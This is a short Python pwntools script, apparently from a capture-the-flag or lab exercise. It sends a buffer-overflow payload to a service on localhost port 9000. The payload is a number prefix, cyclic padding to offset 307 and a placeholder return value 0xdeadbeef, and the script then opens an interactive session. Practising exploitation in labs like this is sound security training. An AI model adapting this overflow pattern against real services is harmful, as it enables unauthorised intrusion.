from pwn import *

p = remote('localhost',9000)

nums = b'11 9 42 12 16 3'
payload = nums + cyclic(307-len(nums)) + p64(0xdeadbeef) + cyclic(100)

p.sendline(payload)
'''
with open("payload", "wb") as f:
    f.write(payload)
'''
p.interactive()